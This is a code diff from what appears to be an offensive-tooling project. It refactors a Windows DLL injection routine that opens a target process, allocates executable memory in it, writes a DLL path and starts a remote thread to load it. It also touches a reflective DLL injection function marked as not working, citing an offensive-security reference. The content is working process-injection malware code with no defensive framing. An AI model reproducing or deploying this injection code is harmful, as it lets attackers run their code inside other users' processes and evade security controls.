@@ -1,24 +1,12 @@
 #include "core/technique.hpp"
 
-// It's used for Reflective DLL Injection.
-typedef struct BASE_RELOCATION_BLOCK {
-	DWORD PageAddress;
-	DWORD BlockSize;
-} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
-
-// It's used for Reflective DLL Injection.
-typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12;
-	USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
-
 namespace Technique::Injection
 {
     BOOL DLLInjection(Procs::PPROCS pProcs, DWORD dwPID, LPVOID lpDllPath, size_t dwDllPathSize)
     {
         HANDLE hProcess;
         HANDLE hThread;
-        PVOID remoteBuffer;
+        LPVOID lpRemoteBuffer;
 
         hProcess = System::Process::ProcessOpen(
             pProcs,
@@ -30,23 +18,23 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        remoteBuffer = System::Process::VirtualMemoryAllocate(
+        lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
             pProcs,
             hProcess,
             dwDllPathSize,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE
+            PAGE_EXECUTE_READWRITE
         );
-        if (!remoteBuffer)
+        if (!lpRemoteBuffer)
         {
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
         if (!System::Process::VirtualMemoryWrite(
             pProcs,
             hProcess,
-            remoteBuffer,
+            lpRemoteBuffer,
             lpDllPath,
             dwDllPathSize,
             NULL
@@ -54,11 +42,11 @@ namespace Technique::Injection
             System::Process::VirtualMemoryFree(
                 pProcs,
                 hProcess,
-                &remoteBuffer,
+                &lpRemoteBuffer,
                 0,
                 MEM_RELEASE
             );
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
@@ -71,11 +59,11 @@ namespace Technique::Injection
             System::Process::VirtualMemoryFree(
                 pProcs,
                 hProcess,
-                &remoteBuffer,
+                &lpRemoteBuffer,
                 0,
                 MEM_RELEASE
             );
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
@@ -83,31 +71,32 @@ namespace Technique::Injection
             pProcs,
             hProcess,
             threadStartRoutineAddr,
-            remoteBuffer
+            lpRemoteBuffer
         );
         if (!hThread)
         {
             System::Process::VirtualMemoryFree(
                 pProcs,
                 hProcess,
-                &remoteBuffer,
+                &lpRemoteBuffer,
                 0,
                 MEM_RELEASE
             );
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
-        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
+        System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);
 
-        pProcs->lpNtClose(hProcess);
-        pProcs->lpNtClose(hThread);
+        System::Handle::HandleClose(pProcs, hProcess);
+        System::Handle::HandleClose(pProcs, hThread);
 
         return TRUE;
     }
 
     // Reference:
     // https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
+    // WARN: Currently not working.
     BOOL ReflectiveDLLInjection(Procs::PPROCS pProcs, LPCWSTR lpDllPath, size_t dwDllPathSize)
     {
         using LPPROC_DLLMAIN = BOOL(WINAPI*)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
